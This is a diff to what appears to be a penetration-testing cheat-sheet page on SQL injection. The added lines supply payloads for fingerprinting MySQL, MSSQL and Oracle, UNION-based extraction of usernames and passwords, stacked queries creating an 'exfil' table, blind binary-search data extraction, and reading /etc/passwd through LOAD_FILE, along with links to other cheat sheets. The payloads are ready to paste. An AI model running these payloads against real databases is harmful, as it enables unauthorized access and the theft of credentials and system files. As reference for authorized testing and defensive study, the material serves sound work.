@@ -86,19 +86,27 @@ exploit
 ' ` " ; /* --
 {% endhighlight %}
 
-Blind Test Strings:<br>
+**Blind Test Strings:**<br>
 *Try the following to see if it provides valid results for text that was interpreted:*
 
 Commenting out the end | <code> Dent' ;# <br> Dent' ;-- </code>
 Inline Commenting | <code> De'/* */'nt </code>
-Concatenation | <code> De' 'nt <br> De'| |'nt </code>
+Concatenation | <code> De''nt <br> De'||'nt </code>
 Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
 Sleep | <code> Sleeep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL
 
 > **SQL Injection: Database Identification**
 
-Oracle | ORA-01756: quoted string not properly terminated
 MS SQL Server | Incorrect syntax near 'something'
+MS SQL Server | <code> 'De'+'nt' </code>
+MS SQL Server | <code> SELECT @@version  </code>
+MS SQL Server | <code> @@pack_received </code>
+MySQL | 'De' 'nt'
+MySQL | <code> SELECT @@version  </code>
+MySQL | <code> connection_id() </code>
+Oracle | ORA-01756: quoted string not properly terminated
+Oracle | <code> 'De'||'nt' </code>
+Oracle | <code> BITAND(1,1) </code>
 PostgreSQL | 5-digit Hex Error Code
 
 > **SQL Injection Union**
@@ -114,8 +122,41 @@ Dent' UNION SELECT  '1', '2', '3', '4'; #
 From the visable numbers select one for the union. <br> *Note: It requires the same number of columns and compatable data type*
 {% highlight sql %}
 Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
+<br>
+or use NULL since it is compatable with everything
+<br>
+Dent' UNION SELECT NULL, NULL, NULL;--
+<b>
 jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts;+--+
 {% endhighlight %}
+
+> **Stacked Queries**
+
+Allows multiple commands with a ';'  (Mostly MSSQL):
+{% highlight sql %}
+Dent' ;  CREATE TABLE exfil(data varchar(1000));-- 
+{% endhighlight %}
+
+> **Blind SQL Injection Data Exfiltration**
+
+Perform a binary search tree: 
+{% highlight sql %}
+substr((select table_name from information_schema.tables limit 1),1,1) > "m"
+…
+= "c"
+{% endhighlight %}
+
+> **Reading and Writing Files**
+
+MySQL - Reading | <code> Dent'+UNION+SELECT++'1'%2C+'2'%2C+'3'%2C+LOAD_FILE("%2Fetc%2Fpasswd")%3B+%23 </code>
+MySQL - Writing | <code> INTO OUTFILE </code>
+SQL Server - Reading | <code> BULK INSERT </code>
+
+> **SQL Injection Cheat Sheets**
+
+* [websec](https://websec.ca/kb/sql_injection)
+* [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
+* [SQLInjection Wiki](http://www.sqlinjectionwiki.com)
 
 > **CSRF**
 
